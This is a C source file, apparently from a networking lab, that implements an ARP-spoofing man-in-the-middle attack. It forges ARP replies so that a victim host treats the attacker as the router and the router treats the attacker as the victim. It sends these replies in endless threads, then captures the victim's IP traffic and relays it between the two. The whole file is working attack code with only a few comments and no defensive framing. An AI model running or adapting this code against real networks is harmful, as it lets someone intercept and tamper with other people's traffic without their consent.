#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/if_ether.h>
#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <net/ethernet.h> 
#include <net/if.h>
#include <string.h>
#include <pthread.h>

#define ROUTER_IP "192.168.194.105" // router (attacker pretend to be router)
#define VIC_IP "192.168.194.160" // victim ip address
#define ATTACK_IP "192.168.194.160"
#define PACKET_LEN 1500
#define AHDR_SIZE sizeof(struct ether_arp)
#define EHDR_SIZE sizeof(struct ether_header)

//attacker mac 00:0c:29:6e:82:33
//victim mac 00:0c:29:9f:8a:7b      
//router mac 26:8e:3a:31:8d:6d

//default gateway ip addess : 192.168.251.76 
//attacker ip address : 192.168.251.88
// victim ip address : 192.168.251.217

void die(char * buff){
	perror(buff);
	exit(1);
}

typedef struct{
	struct sockaddr_ll dest_addr;
	int sockfd;
	char * reply_packet;
}thread_args;

void * spoof(void * args){
	thread_args smthng = *(thread_args * )args;
	while(1){
    	if(sendto(smthng.sockfd, smthng.reply_packet, PACKET_LEN, 0, (struct sockaddr *)&smthng.dest_addr, sizeof(smthng.dest_addr))<0)die("sendto");
    	sleep(0.5);
    }
}

int main(){
	int sockfd;
	if((sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0)die("sockfd");

	// arp reply
	char reply_packet[PACKET_LEN];
	struct ether_header *reply_e_header = (struct ether_header * )reply_packet;

	reply_e_header->ether_dhost[0] = 0x00;  // victim mac address
	reply_e_header->ether_dhost[1] = 0x0c;
	reply_e_header->ether_dhost[2] = 0x29;
	reply_e_header->ether_dhost[3] = 0x9f;
	reply_e_header->ether_dhost[4] = 0x8a;
	reply_e_header->ether_dhost[5] = 0x7b;

	reply_e_header->ether_shost[0] = 0x00;  // attacker mac address
    reply_e_header->ether_shost[1] = 0x0c;
    reply_e_header->ether_shost[2] = 0x29;
    reply_e_header->ether_shost[3] = 0x6e;
    reply_e_header->ether_shost[4] = 0x82;
    reply_e_header->ether_shost[5] = 0x33;
    reply_e_header->ether_type = htons(ETH_P_ARP);

    struct ether_arp *reply_arph = (struct ether_arp *)(reply_packet+EHDR_SIZE);
	reply_arph->arp_hrd = htons(ARPHRD_ETHER);
    reply_arph->arp_pro = htons(ETH_P_IP);
    reply_arph->arp_hln = 6;
    reply_arph->arp_pln = 4;
    reply_arph->arp_op = htons(ARPOP_REPLY);

    //payload
    memcpy(reply_arph->arp_sha,reply_e_header->ether_shost,ETH_ALEN);
    inet_pton(AF_INET, ROUTER_IP, &reply_arph->arp_spa);						// attacker pretending to be router ip
	memcpy(reply_arph->arp_tha,reply_e_header->ether_dhost,ETH_ALEN);
	inet_pton(AF_INET, VIC_IP, &reply_arph->arp_tpa);

	//dest addr
	struct sockaddr_ll dest_addr;
	dest_addr.sll_family = AF_PACKET;
    dest_addr.sll_protocol = htons(ETH_P_ARP);
    dest_addr.sll_ifindex = if_nametoindex("ens33");
    dest_addr.sll_hatype = ARPHRD_ETHER;
    dest_addr.sll_halen = ETH_ALEN;
    memcpy(dest_addr.sll_addr,reply_e_header->ether_dhost,ETH_ALEN);
    dest_addr.sll_addr[6] = 0;
    dest_addr.sll_addr[7] = 0;

    //create a thread here for arp spoofing ---------------------------------------------------------------------------------------------

    pthread_t p1;
    thread_args tos = {
		dest_addr,sockfd,reply_packet
	};
    pthread_create(&p1,NULL,spoof,(void *)&tos);

    // -----------------------------------------------------------------------------------------------------------------------------------

    int sockfd1;
    if((sockfd1 = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0)die("sockfd");

    // arp reply
    char reply_packet1[PACKET_LEN];
    struct ether_header *router_reply_e_header = (struct ether_header * )reply_packet1;

    router_reply_e_header->ether_dhost[0] = 0x26;  // ROUTER mac address i.e. 26:8e:3a:31:8d:6d
    router_reply_e_header->ether_dhost[1] = 0x8e;
    router_reply_e_header->ether_dhost[2] = 0x3a;
    router_reply_e_header->ether_dhost[3] = 0x31;
    router_reply_e_header->ether_dhost[4] = 0x8d;
    router_reply_e_header->ether_dhost[5] = 0x6d;

    router_reply_e_header->ether_shost[0] = 0x00;  // attacker mac address
    router_reply_e_header->ether_shost[1] = 0x0c;
    router_reply_e_header->ether_shost[2] = 0x29;
    router_reply_e_header->ether_shost[3] = 0x6e;
    router_reply_e_header->ether_shost[4] = 0x82;
    router_reply_e_header->ether_shost[5] = 0x33;
    router_reply_e_header->ether_type = htons(ETH_P_ARP);

    struct ether_arp *router_reply_arph = (struct ether_arp *)(reply_packet1+EHDR_SIZE);
    router_reply_arph->arp_hrd = htons(ARPHRD_ETHER);
    router_reply_arph->arp_pro = htons(ETH_P_IP);
    router_reply_arph->arp_hln = 6;
    router_reply_arph->arp_pln = 4;
    router_reply_arph->arp_op = htons(ARPOP_REPLY);

    //payload
    memcpy(router_reply_arph->arp_sha,router_reply_e_header->ether_shost,ETH_ALEN);
    inet_pton(AF_INET, VIC_IP, &router_reply_arph->arp_spa);                       // attacker pretending to be victim ip
    memcpy(router_reply_arph->arp_tha,router_reply_e_header->ether_dhost,ETH_ALEN);
    inet_pton(AF_INET, ROUTER_IP, &router_reply_arph->arp_tpa);

    //dest addr
    struct sockaddr_ll dest_addr1;
    dest_addr1.sll_family = AF_PACKET;
    dest_addr1.sll_protocol = htons(ETH_P_ARP);
    dest_addr1.sll_ifindex = if_nametoindex("ens33");
    dest_addr1.sll_hatype = ARPHRD_ETHER;
    dest_addr1.sll_halen = ETH_ALEN;
    memcpy(dest_addr1.sll_addr,router_reply_e_header->ether_dhost,ETH_ALEN);
    dest_addr1.sll_addr[6] = 0;
    dest_addr1.sll_addr[7] = 0;

    pthread_t p2;
    thread_args tos1 = {
        dest_addr1,sockfd1,reply_packet1
    };
    pthread_create(&p2,NULL,spoof,(void *)&tos1);

    // ----------------------------------------------------------------------------------------------------------------------------------
    // disable ipforwarding if it is on manually :
    // "sudo sysctl -w net.ipv4.ip_forward=0"

    int nsfd;
    if((nsfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP))) < 0)die("new socket");
    char buffer[PACKET_LEN];

    while(1){
    	if(recv(nsfd,buffer,PACKET_LEN,0) < 0)die("recv2()");
    	struct ether_header *fr_e_header = (struct ether_header *)buffer;
    	struct iphdr *fr_ip_header = (struct iphdr *)(buffer + EHDR_SIZE);
    	char reccv[100];
    	inet_ntop(AF_INET,&fr_ip_header->saddr, reccv,100);
    	printf("recieved from :%s\n",reccv);
        if(strcmp(VIC_IP,reccv) == 0){
            memcpy(fr_e_header->ether_shost,fr_e_header->ether_dhost,ETH_ALEN);
        	memcpy(fr_e_header->ether_dhost,dest_addr1.sll_addr,ETH_ALEN);
    		if (sendto(nsfd, buffer, PACKET_LEN, 0,(struct sockaddr *)&dest_addr1,sizeof(dest_addr1)) < 0)die("sendto");
    		printf("sent to router\n");
        }
        else{
            memcpy(fr_e_header->ether_shost,fr_e_header->ether_dhost,ETH_ALEN);
            memcpy(fr_e_header->ether_dhost,dest_addr.sll_addr,ETH_ALEN);
            if (sendto(nsfd, buffer, PACKET_LEN, 0,(struct sockaddr *)&dest_addr,sizeof(dest_addr)) < 0)die("sendto");
            printf("sent to victim\n");
        }
    }

    pthread_join(p1, NULL);
    pthread_join(p2,NULL);

}
